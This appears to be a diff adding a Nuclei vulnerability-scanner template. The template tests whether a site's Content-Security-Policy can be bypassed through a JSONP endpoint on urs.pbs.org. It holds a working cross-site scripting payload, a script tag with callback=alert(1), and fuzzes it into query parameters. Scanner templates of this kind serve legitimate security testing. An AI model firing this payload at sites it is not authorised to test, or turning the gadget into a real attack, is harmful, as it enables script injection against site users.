@@ -1,0 +1,55 @@
+id: pbs-urs-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - PBS URS
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,pbs-urs,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "pbs.org"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: pbs_urs_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://urs.pbs.org/redirect/1/?format=jsonp&callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "pbs_urs_csp_xss == true"
+# digest: 4a0a00473045022100dc26f11f463c8b4ba8c9e6fd62dacd65490c8449374d67ced00af412f2163b0802204dceab61ad4e52e6e9f15d0c8c22a668de325b5a73de67f70944516a586b989a:922c64590222798bb761d5b6d8e72950
